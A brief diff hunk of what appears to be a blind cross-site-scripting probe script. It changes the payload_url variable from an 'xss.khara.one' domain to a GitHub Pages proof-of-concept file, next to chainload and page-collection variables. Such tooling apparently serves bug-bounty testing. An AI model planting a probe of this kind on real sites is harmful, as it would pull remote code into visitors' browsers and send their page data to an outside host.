@@ -121,7 +121,7 @@ if ("undefined" != typeof Blob && ("undefined" == typeof FormData || !FormData.p
 
 
 var chainload_uri = "";
-var payload_url = "https://xss.khara.one/";
+var payload_url = "https://khara-h1.github.io/poc/probe.js";
 var collect_page_list = []
 
 // Source: https://stackoverflow.com/a/20151856/1195812
